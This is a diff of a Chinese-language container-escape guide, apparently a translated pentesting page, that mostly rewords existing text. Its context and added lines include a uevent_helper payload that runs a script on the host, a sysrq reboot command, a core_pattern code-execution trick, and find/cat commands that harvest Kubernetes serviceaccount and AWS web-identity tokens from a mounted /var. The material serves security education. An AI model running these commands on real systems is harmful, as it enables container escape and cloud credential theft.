@@ -15,7 +15,7 @@
 #### **`/proc/sys/kernel/core_pattern`**
 
 - 在 [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) 中描述。
-- 允许定义在核心文件生成时执行的程序，前 128 字节作为参数。如果文件以管道 `|` 开头，可能导致代码执行。
+- 允许定义在生成核心文件时执行的程序，前 128 字节作为参数。如果文件以管道 `|` 开头，可能导致代码执行。
 - **测试和利用示例**：
 
 ```bash
@@ -122,7 +122,7 @@ echo b > /proc/sysrq-trigger # 重启主机
 - 写入 `/sys/kernel/uevent_helper` 可以在 `uevent` 触发时执行任意脚本。
 - **利用示例**： %%%bash
 
-#### 创建有效负载
+#### 创建有效载荷
 
 echo "#!/bin/sh" > /evil-helper echo "ps > /output" >> /evil-helper chmod +x /evil-helper
 
@@ -157,7 +157,7 @@ cat /output %%%
 
 #### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**
 
-- 暴露与 NVRAM 中 EFI 变量交互的接口。
+- 暴露与 NVRAM 中的 EFI 变量交互的接口。
 - 配置错误或利用可能导致笔记本电脑砖化或主机无法启动。
 
 #### **`/sys/kernel/debug`**
@@ -167,7 +167,10 @@ cat /output %%%
 
 ### `/var` 漏洞
 
-主机的 **/var** 文件夹包含容器运行时套接字和容器的文件系统。如果该文件夹在容器内挂载，该容器将获得对其他容器文件系统的读写访问权限，具有 root 权限。这可能被滥用以在容器之间进行跳转，导致拒绝服务，或为在其中运行的其他容器和应用程序后门。
+主机的 **/var** 文件夹包含容器运行时套接字和容器的文件系统。
+如果该文件夹在容器内挂载，则该容器将获得对其他容器文件系统的读写访问权限
+并具有 root 权限。这可能被滥用以在容器之间进行切换，导致拒绝服务，或为其他
+容器和在其中运行的应用程序设置后门。
 
 #### Kubernetes
 
@@ -224,14 +227,18 @@ XSS 是通过以下方式实现的：
 
 ##### 访问云凭证
 
-容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这使得容器能够获得对 K8s 或云的未经授权访问：
+容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这允许容器获得对 K8s 或云的未经授权访问：
 ```bash
-/ # cat /host-var/run/secrets/kubernetes.io/serviceaccount/token
-/ # cat /host-var/run/secrets/eks.amazonaws.com/serviceaccount/token
+/ # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
+/host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
+<SNIP>
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/kube-api-access-bljdj/..2025_01_22_12_17_53.265458487/token
+/host-var/lib/kubelet/pods/01c671a5-aaeb-4e0b-adcd-1cacd2e418ac/volumes/kubernetes.io~projected/aws-iam-token/..2025_01_22_03_45_56.2328221474/token
+/host-var/lib/kubelet/pods/5fb6bd26-a6aa-40cc-abf7-ecbf18dde1f6/volumes/kubernetes.io~projected/kube-api-access-fm2t6/..2025_01_22_12_25_25.3018586444/token
 ```
 #### Docker
 
-在Docker（或Docker Compose部署）中的利用方式完全相同，唯一的区别是其他容器的文件系统通常在不同的基础路径下可用：
+在Docker（或Docker Compose部署）中的利用方式完全相同，只是通常其他容器的文件系统在不同的基础路径下可用：
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
@@ -249,9 +256,7 @@ drwx--x---  4 root root  4096 Jan  9 21:22 062f14e5adbedce75cea699828e22657c8044
 ```
 #### 注意
 
-实际路径在不同的设置中可能会有所不同，这就是为什么你最好的选择是使用 **find** 命令来定位其他容器的文件系统
-
-
+实际路径在不同的设置中可能会有所不同，这就是为什么你最好的选择是使用 **find** 命令来定位其他容器的文件系统和 SA / web 身份令牌。
 
 ### 参考文献
 
